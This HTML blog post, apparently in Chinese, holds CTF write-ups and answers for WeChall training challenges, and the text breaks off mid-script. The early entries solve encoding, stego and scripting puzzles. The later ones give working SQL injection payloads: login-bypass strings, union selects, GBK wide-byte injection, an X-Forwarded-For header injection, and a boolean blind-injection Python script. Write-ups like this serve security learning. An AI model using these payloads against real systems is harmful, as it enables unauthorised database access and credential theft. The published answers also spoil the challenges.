<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>wechall答案 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Training: Get Sourced看源码 1&lt;!-- You are looking for this password: html_sourcecode --&gt;      提交html_sourcecode即可 Training: Stegano工具：winhex 将图片拖拽到winhex中 得到 1Look what the hex-edit revealed: passw">
<meta property="og:type" content="article">
<meta property="og:title" content="wechall答案">
<meta property="og:url" content="http://example.com/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Training: Get Sourced看源码 1&lt;!-- You are looking for this password: html_sourcecode --&gt;      提交html_sourcecode即可 Training: Stegano工具：winhex 将图片拖拽到winhex中 得到 1Look what the hex-edit revealed: passw">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-01-24T07:38:22.000Z">
<meta property="article:modified_time" content="2021-01-28T08:43:06.467Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="答案">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-CTF-wp-wechall答案" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/" class="article-date">
  <time class="dt-published" datetime="2021-01-24T07:38:22.000Z" itemprop="datePublished">2021-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      wechall答案
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Training-Get-Sourced"><a href="#Training-Get-Sourced" class="headerlink" title="Training: Get Sourced"></a>Training: Get Sourced</h1><p>看源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- You are looking for this password: html_sourcecode --&gt;     </span><br></pre></td></tr></table></figure>
<p>提交html_sourcecode即可</p>
<h1 id="Training-Stegano"><a href="#Training-Stegano" class="headerlink" title="Training: Stegano"></a>Training: Stegano</h1><p>工具：winhex</p>
<p>将图片拖拽到winhex中</p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Look what the hex-edit revealed: passwd:steganoI</span><br></pre></td></tr></table></figure>
<p>提交steganoI</p>
<h1 id="Training-Crypto-Caesar"><a href="#Training-Crypto-Caesar" class="headerlink" title="Training: Crypto - Caesar"></a>Training: Crypto - Caesar</h1><p>考察凯撒密码</p>
<p>由于每次出来的字符串都不一样，所以把位移数26遍历了一遍，找到其中有实际意义的那一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str1 &#x3D; &quot;AOL XBPJR IYVDU MVE QBTWZ VCLY AOL SHGF KVN VM JHLZHY HUK FVBY BUPXBL ZVSBAPVU PZ WPHLPYYJYVOO&quot;</span><br><span class="line">str2 &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(26):</span><br><span class="line">	for s in str1:</span><br><span class="line">		if s !&#x3D; &quot; &quot;:</span><br><span class="line">			num &#x3D; (ord(s) - ord(&#39;A&#39;) + i) % 26</span><br><span class="line">			str2 +&#x3D; chr(ord(&#39;A&#39;)+num)</span><br><span class="line">		else:</span><br><span class="line">			str2 +&#x3D; s</span><br><span class="line">	print(str2)</span><br><span class="line">	str2 &#x3D; &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training: WWW-Robots"></a>Training: WWW-Robots</h1><p>考察robots.txt</p>
<p>没想到直接放到根目录底下了。。。</p>
<p>访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wechall.net&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;challenge&#x2F;training&#x2F;www&#x2F;robots&#x2F;T0PS3CR3T</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
<p>访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wechall.net&#x2F;challenge&#x2F;training&#x2F;www&#x2F;robots&#x2F;T0PS3CR3T</span><br></pre></td></tr></table></figure>
<h1 id="Training-ASCII"><a href="#Training-ASCII" class="headerlink" title="Training ASCII"></a>Training ASCII</h1><p>考察：ASCII码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str1 &#x3D; &quot;84, 104, 101, 32, 115, 111, 108, 117, 116, 105, 111, 110, 32, 105, 115, 58, 32, 111, 109, 105, 104, 112, 115, 115, 104, 108, 97, 110, 112&quot;</span><br><span class="line"></span><br><span class="line">str2 &#x3D; str1.split(&quot;,&quot;)</span><br><span class="line">text &#x3D; &quot;&quot;</span><br><span class="line">for i in str2:</span><br><span class="line">	temp &#x3D; int(i)</span><br><span class="line">	text +&#x3D; chr(temp)</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The solution is: omihpsshlanp</span><br></pre></td></tr></table></figure>
<h1 id="Encoding-URL"><a href="#Encoding-URL" class="headerlink" title="Encoding: URL"></a>Encoding: URL</h1><p>用firefox的hackbar解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%59%69%70%70%65%68%21%20%59%6F%75%72%20%55%52%4C%20%69%73%20%63%68%61%6C%6C%65%6E%67%65%2F%74%72%61%69%6E%69%6E%67%2F%65%6E%63%6F%64%69%6E%67%73%2F%75%72%6C%2F%73%61%77%5F%6C%6F%74%69%6F%6E%2E%70%68%70%3F%70%3D%73%67%6D%65%67%61%70%62%69%6D%70%61%26%63%69%64%3D%35%32%23%70%61%73%73%77%6F%72%64%3D%66%69%62%72%65%5F%6F%70%74%69%63%73%20%56%65%72%79%20%77%65%6C%6C%20%64%6F%6E%65%21</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yippeh! Your URL is challenge&#x2F;training&#x2F;encodings&#x2F;url&#x2F;saw_lotion.php?p&#x3D;sgmegapbimpa&amp;cid&#x3D;52#password&#x3D;fibre_optics Very well done!</span><br></pre></td></tr></table></figure>
<h1 id="Prime-Factory"><a href="#Prime-Factory" class="headerlink" title="Prime Factory"></a>Prime Factory</h1><p>竟然是算法题。。。</p>
<p>本身为素数，所有数位上的数字和也为素数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">high = <span class="number">1000000</span>+<span class="number">1</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># prime_num = &#123;&quot;2&quot;, &quot;3&quot;, &quot;5&quot;, &quot;7&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validNum</span>(<span class="params">num</span>):</span></span><br><span class="line">	str_num = <span class="built_in">str</span>(num)</span><br><span class="line">	temp = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> s <span class="keyword">in</span> str_num:</span><br><span class="line">		temp += <span class="built_in">int</span>(s)</span><br><span class="line">	<span class="keyword">if</span> validPrime(temp):</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validPrime</span>(<span class="params">num</span>):</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(math.sqrt(num) )+ <span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> num % j == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(high, high * <span class="number">10</span>):</span><br><span class="line">	<span class="keyword">if</span> validPrime(i) <span class="keyword">and</span> validNum(i):</span><br><span class="line">		ans += <span class="built_in">str</span>(i)</span><br><span class="line">		print(i)</span><br><span class="line">		flag += <span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> flag == <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1000033</span><br><span class="line">1000037</span><br><span class="line">10000331000037</span><br></pre></td></tr></table></figure>
<h1 id="Training-Encoding"><a href="#Training-Encoding" class="headerlink" title="Training: Encoding"></a>Training: Encoding</h1><p>考察：二进制的转换，ASCII码，JPocketKnife</p>
<p>JPocket是用来编码转换的小工具</p>
<p>由于只有01，判断是ASCII码的题</p>
<p>标准ASCII码使用7位二进制数来表示所有大小写字母，数字，标点，特殊控制符（剩余1位为0）</p>
<p>本题要修改BitsPerBlock为7（长度为441，不能被8整除）</p>
<p>![CTF-wp-wechall Training Encoding2](.\pic\CTF-wp-wechall Training Encoding2.png)</p>
<p>![CTF-wp-wechall Training Encoding1](.\pic\CTF-wp-wechall Training Encoding1.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This text is 7-bit encoded ascii. Your password is easystarter.</span><br></pre></td></tr></table></figure>


<h2 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h2><p>标准ASCII码使用7位二进制数来表示所有大小写字母，数字，标点，特殊控制符（剩余1位为0）</p>
<h1 id="Training-Programming-1"><a href="#Training-Programming-1" class="headerlink" title="Training: Programming 1"></a>Training: Programming 1</h1><p>考察：python的requests库</p>
<p>拿到访问链接的值，填充到第二个链接访问</p>
<p>由于需要确认访问者身份，因此需要用到cookie</p>
<p>进入到第一个链接，发现cookie如下</p>
<p>![CTF-wp-wechall Training Programming1](.\pic\CTF-wp-wechall Training Programming1.png)</p>
<p>那么就可以构造以下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://www.wechall.net/challenge/training/programming1/index.php?action=request&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://www.wechall.net/challenge/training/programming1/index.php?answer=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="built_in">dict</span>(WC=<span class="string">&quot;13191858-57927-oQHWYThmhwmYUy2X&quot;</span>)</span><br><span class="line">resp1 = requests.get(url1, cookies=cookie)</span><br><span class="line">resp2 = requests.get(url2.<span class="built_in">format</span>(resp1.text), cookies=cookie)</span><br><span class="line"></span><br><span class="line">print(resp2.text)</span><br></pre></td></tr></table></figure>
<h1 id="Training-Regex"><a href="#Training-Regex" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^$&#x2F;</span><br></pre></td></tr></table></figure>
<h1 id="Training-MYSQL-I"><a href="#Training-MYSQL-I" class="headerlink" title="Training: MYSQL I"></a>Training: MYSQL I</h1><p>考察：万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; #</span><br><span class="line">password: 123</span><br></pre></td></tr></table></figure>
<p>注意，username处不能写admin’ or 1=1#，因为username在原sql语句中是where的筛选条件</p>
<h1 id="Training-MYSQL-II"><a href="#Training-MYSQL-II" class="headerlink" title="Training: MYSQL II"></a>Training: MYSQL II</h1><p>考察：账号密码分开验证时，MYSQL登陆的绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: -1&#39; union select 1,&#39;admin&#39;,md5(&#39;password&#39;) #</span><br><span class="line">password: password</span><br></pre></td></tr></table></figure>
<h1 id="No-Escape"><a href="#No-Escape" class="headerlink" title="No Escape"></a>No Escape</h1><p>考察：PHP代码审计，mysql的反引号</p>
<p>观察可知，URL处的vote变量即每次提交button时加1的变量，猜测可在URL出注入</p>
<p>阅读源码，直接跳到sql语句一处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;UPDATE noescvotes SET &#96;$who&#96;&#x3D;&#96;$who&#96;+1 WHERE id&#x3D;1&quot;;</span><br></pre></td></tr></table></figure>
<p>故payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.wechall.net&#x2F;challenge&#x2F;no_escape&#x2F;index.php?vote_for&#x3D;bill&#96;&#x3D;111--+</span><br></pre></td></tr></table></figure>
<p>注意此处为反引号，因为原sql语句就是反引号</p>
<h2 id="mysql中的单引号、双引号、反引号"><a href="#mysql中的单引号、双引号、反引号" class="headerlink" title="mysql中的单引号、双引号、反引号"></a>mysql中的单引号、双引号、反引号</h2><p>单双引号用法相同，是使用字符串时使用的符号</p>
<p>反引号用于区分mysql中的保留字符和普通字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#假如表A中有一列名为select，查询该列</span><br><span class="line">select select from A;   #错误</span><br><span class="line">select &#96;select&#96; from A;  #正确</span><br></pre></td></tr></table></figure>
<h1 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h1><p>考察：宽字节注入<br>由于编码为gbk，且使用了addslashes过滤username处的单引号，使用宽字节注入</p>
<p>由于原sql语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;SELECT username FROM users WHERE username&#x3D;&#39;$username&#39; AND password&#x3D;&#39;$password&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>使用宽字节注入以后，语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM users WHERE username&#x3D;&#39;admin 运&#39; # AND password&#x3D;&#39;password&#39;</span><br></pre></td></tr></table></figure>
<p>因此，还要再从数据库中选出username，因此有了如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.wechall.net&#x2F;challenge&#x2F;addslashes&#x2F;index.php?username&#x3D;admin+%Df%27+union+select+username+from+users+limit+1,1+%23&amp;password&#x3D;123&amp;login&#x3D;%E6%B3%A8%E5%86%8C</span><br></pre></td></tr></table></figure>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p><strong>参考</strong></p>
<p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/heiseweiye/article/details/82723478">https://blog.csdn.net/heiseweiye/article/details/82723478</a></p>
<p><strong>条件</strong></p>
<p>​    编码为gbk</p>
<p><strong>用法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;1</span><br><span class="line">select * from user where  id &#x3D;&#39;1\&#39; and 1&#x3D;1#&#39;</span><br><span class="line">	id&#x3D;1&#39; and 1&#x3D;1%23</span><br><span class="line">select * from user where id &#x3D;&#39;1運&#39; and 1&#x3D;1#&#39;</span><br><span class="line">	id&#x3D;1%df&#39; and 1&#x3D;1%23</span><br></pre></td></tr></table></figure>
<p><strong>原理</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GBK为多字节编码，两个字节代表一个汉字，此时%DF与后面的&#x2F;，也就是%5c变成了一个汉字</span><br></pre></td></tr></table></figure>
<h1 id="The-Guestbook"><a href="#The-Guestbook" class="headerlink" title="The Guestbook"></a>The Guestbook</h1><p>考察：X-Forwarded-For注入</p>
<p>上来搜$query语句，总共有下面这些</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;DELETE FROM gbook_book WHERE gbb_time&lt;$cut&quot;;</span><br><span class="line">$query &#x3D; &quot;INSERT INTO gbook_book VALUES(&#39;$playerid&#39;, $userid, $time, &#39;$ip&#39;, &#39;$message&#39;)&quot;; </span><br><span class="line">$query &#x3D; &quot;DELETE FROM gbook_book WHERE gbb_sessid&#x3D;&#39;$playerid&#39;&quot;;</span><br><span class="line">$query &#x3D; &quot;SELECT * FROM gbook_book WHERE gbb_sessid&#x3D;&#39;$playerid&#39;&quot;;</span><br></pre></td></tr></table></figure>
<p>只有第2和4句有注入可能</p>
<p>先看第4句，深入找一下playerid的地方，最终溯源到gbook_playerID，这个再往前找，是SESSION_ID。跳过</p>
<p>看第2句，这五个变量来源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$playerid &#x3D; gbook_playerID(true); &#x2F;&#x2F; Current Player</span><br><span class="line">$userid &#x3D; 0; # guestbook has no login yet.</span><br><span class="line">$time &#x3D; time();</span><br><span class="line">$ip &#x3D; gbook_getIP();</span><br><span class="line">$message &#x3D; GDO::escape($message); </span><br></pre></td></tr></table></figure>
<p>溯源以后发现只有ip有注入可能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function gbook_getIP()</span><br><span class="line">&#123;</span><br><span class="line">        if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">                return $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        elseif (isset($_SERVER[&#39;HTTP_VIA&#39;])) &#123; </span><br><span class="line">                return $_SERVER[&#39;HTTP_VIA&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">                return $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>X-Forwarded-For注入，改一下包就完事了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1&#39;,(SELECT gbu_password FROM gbook_user WHERE gbu_name&#x3D;&#39;Admin&#39;));#</span><br></pre></td></tr></table></figure>
<p>得到密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TheBrownFoxAndTheLazyDog</span><br></pre></td></tr></table></figure>
<h1 id="MD5-salt"><a href="#MD5-salt" class="headerlink" title="MD5.salt"></a>MD5.salt</h1><p>考察：md5，回显注入</p>
<p>参考：<a target="_blank" rel="noopener" href="http://rk700.github.io/2014/06/17/md5-salt/">http://rk700.github.io/2014/06/17/md5-salt/</a></p>
<p>抓包，是post提交</p>
<p>尝试username：admin’，有回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GDO Error(1064): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39;&#39; at line 1</span><br><span class="line">SELECT * FROM users WHERE username&#x3D;&#39;admin&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>故尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello Admin... checking your credentials...</span><br></pre></td></tr></table></figure>
<p>用户名Admin的值是回显的，把password传给Admin的文职</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;-1&#39; union select password,3 from users where username&#x3D;&#39;Admin&#39;#</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello 215c61d0104f8925b5f7e4e87a7cbdfa... checking your credentials...</span><br></pre></td></tr></table></figure>
<p>然后需要破解MD5的工具，网上没有现成答案也没有免费的，跳过</p>
<p>等等</p>
<p>参考链接的wp没看懂怎么操作的，但是通过空密码用户去套取salt的方式值得参考</p>
<h1 id="Table-Names"><a href="#Table-Names" class="headerlink" title="Table Names"></a>Table Names</h1><p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>可进入</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39;#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>得到同样信息，说明是可注入的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and 1&#x3D;1#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>同样通过，那么可以使用布尔盲注或者updatexml</p>
<p>优先选择updatexml，比较方便</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and updatexml(1,concat(0x7e,(database(),0x7e),1)#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>只有报错，没有回显</p>
<p>尝试语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: test&#39; and if(1&#x3D;1,1,2)&#x3D;1#</span><br><span class="line">password: test</span><br></pre></td></tr></table></figure>
<p>能够登陆</p>
<p>盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.wechall.net/challenge/table_names/challenge.php?username=test&#x27;+and+if(&#123;&#125;,1,2)=1%23&amp;password=test&amp;login=login&quot;</span></span><br><span class="line"></span><br><span class="line">success = <span class="string">&quot;Welcome back test&quot;</span></span><br><span class="line">payload1 = <span class="string">&quot;ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">db_name = <span class="string">&quot;&quot;</span></span><br><span class="line">tb_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(1, 60):</span></span><br><span class="line"><span class="comment"># 	low = 32</span></span><br><span class="line"><span class="comment"># 	high = 128</span></span><br><span class="line"><span class="comment"># 	while low &lt; high:</span></span><br><span class="line"><span class="comment"># 		mid = (low + high) &gt;&gt; 1</span></span><br><span class="line"><span class="comment"># 		payload = payload1.format(i, mid)</span></span><br><span class="line"><span class="comment"># 		resp = requests.get(url.format(payload))</span></span><br><span class="line"><span class="comment"># 		# print(j)</span></span><br><span class="line"><span class="comment"># 		# print(url.format(payload))</span></span><br><span class="line"><span class="comment"># 		# print( resp.text)</span></span><br><span class="line"><span class="comment"># 		if success in resp.text:</span></span><br><span class="line"><span class="comment"># 			low = mid + 1</span></span><br><span class="line"><span class="comment"># 		else:</span></span><br><span class="line"><span class="comment"># 			high = mid</span></span><br><span class="line"><span class="comment"># 	if low == 32 or high == 128:</span></span><br><span class="line"><span class="comment"># 		break</span></span><br><span class="line"><span class="comment"># 	else:</span></span><br><span class="line"><span class="comment"># 		db_name += chr(low)</span></span><br><span class="line"><span class="comment"># 		print(db_name)</span></span><br><span class="line"></span><br><span class="line">db_name 